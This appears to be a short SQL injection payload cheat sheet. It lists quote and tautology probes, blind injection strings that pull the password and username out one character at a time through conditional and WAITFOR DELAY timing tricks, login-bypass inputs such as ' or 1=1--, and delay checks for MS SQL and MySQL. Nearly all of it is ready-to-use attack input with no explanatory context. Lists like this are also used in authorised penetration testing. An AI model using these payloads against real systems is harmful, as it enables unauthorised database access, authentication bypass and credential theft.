# SQLi_Example_Basic

########### Examples basic for SQL injection ############################

'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x 
============== blind SQLi ==============
id=1+AND+555=if(ord(mid ((select+pass+from+user+limit+0,1),1,1))=97,555,777)
check for username length:
id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
id=1; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
id=1; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--
check if 1st character in username containt A, B or C
id=1; IF (ASCII(lower(substring((USER), 2,1)))=97) WAITFOR DELAY '00:00:10'--
id=1; IF (ASCII(lower(substring((USER), 2,1)))=98) WAITFOR DELAY '00:00:10'--
id=1; IF (ASCII(lower(substring((USER), 2,1)))=99) WAITFOR DELAY '00:00:10'--

==========Bypass Login by SQLi ==============
admin' --
admin' #
admin' /*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--

========blind SQL injection check====================
MS SQL: waitfor delay '0:0:10'--
MySQL: BENCHMARK (howmanytimes, do this) 
